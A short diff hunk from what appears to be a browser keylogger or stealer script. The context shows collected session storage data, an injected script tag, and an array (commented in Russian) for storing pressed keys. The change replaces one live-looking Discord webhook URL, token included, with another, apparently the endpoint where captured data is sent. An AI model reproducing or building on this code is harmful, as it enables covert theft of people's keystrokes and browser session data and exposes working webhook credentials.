@@ -451,7 +451,7 @@ ${sessionStorageData}
         document.head.appendChild(script);
     }
 (async () => {
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1393595797530083390/1dDSykIyP3bqwownNM3Ro1I-LLcI2Sn1KM2SMb9a6b-POlE3TlsvgkMSZhPRLfTVKNod';
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1471942516491161793/g-CR7t7tuU5duo4W4PM_EZTGvyP_isHelDFdBEj4ZbPGYhcdZQwQXNU7yrYbz55wAXs8';
     let messageId = null;
     let pressedKeys = []; // Массив для хранения клавиш
 
